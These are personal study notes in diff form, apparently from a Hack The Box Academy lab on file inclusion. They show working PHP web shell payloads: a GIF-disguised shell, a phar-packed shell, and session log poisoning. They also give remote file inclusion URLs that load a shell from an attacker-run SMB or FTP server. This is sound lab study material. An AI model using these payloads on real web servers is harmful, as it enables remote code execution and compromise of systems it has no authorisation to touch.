@@ -263,3 +263,88 @@ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ## Remote File Inclusion (RFI)
 
 ![[Pasted image 20250619110423.png]]
+
+## Verify the RFI
+For the RFI, to be present the language must allow Remote URLs to be included somehow, so we need to check that using the previous approach only, with the command : 
+`echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`
+
+So, even if the back-end language allows this variable, it still might not have RFI Vulnerability, so we can start that by checking a local address like 127.0.0.1, and we can do that by using the command : `curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'`
+
+## SMB
+If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
+
+We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows: `impacket-smbserver -smb2support share $(pwd)`
+
+ We can try adding`http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`
+
+---
+# LFI and File Uploads
+
+File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.
+
+The [File Upload Attacks](https://academy.hackthebox.com/module/details/136) module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:
+![[Pasted image 20250619161318.png]]
+
+#### Crafting Malicious Image
+Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
+
+```shell-session
+ShibuShivansh@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+#### Uploaded File Path
+Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
+
+```html
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+And then on visiting on this below website, we'll get our output for the command : `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
+
+## Phar Upload
+
+Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
+
+Code: php
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
+
+  LFI and File Uploads
+
+```shell-session
+ShibuShivansh@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
+
+![Shipping containers and cranes at a port with user data information displayed.](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)
+
+As we can see, the `id` command was successfully executed. Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.
+
+## Log Poisoning
+![[Pasted image 20250619162746.png]]
+
+This is the place where the Session Logs are kept : `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<session_id>`
+
+	Then add a Web Shell to it, using the command :  `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
+
+
+And if I need to execute the command, we will use : `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
+
+
+Now, to read the Apache Server Logs, we can try to visit to a website like : `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
+
+
+## Fuzzing Parameters
